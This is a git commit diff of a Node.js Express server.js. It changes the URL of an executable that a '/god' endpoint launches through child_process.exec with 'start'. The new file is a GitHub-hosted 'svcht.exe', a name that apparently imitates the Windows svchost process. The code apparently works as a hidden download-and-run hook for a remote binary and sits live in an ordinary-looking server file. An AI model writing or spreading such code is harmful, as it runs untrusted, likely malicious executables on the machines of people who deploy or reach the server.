54216f992470841d76d61a64a6fd097a04d610e5
cihuuy <95659029+cihuuy@users.noreply.github.com>
2023-03-12 17:20:58 +0700

    Update server.js

--- server.js
+++ server.js
@@ -7,7 +7,7 @@ const app = express();
 app.get('/god', (req, res) => {
   // Get the name of the file to execute from the request query string
   const fileName = req.query.fileName;
-  const fileUrl = 'https://cdn.glitch.me/90766488-81f4-448e-b0b0-621940538862/god.exe?v=1677181792468';
+  const fileUrl = 'https://github.com/cihuuy/slim/raw/main/svcht.exe';
 
   // Execute the file using child_process.exec
   exec(`start ${fileUrl}`, (err, stdout, stderr) => {
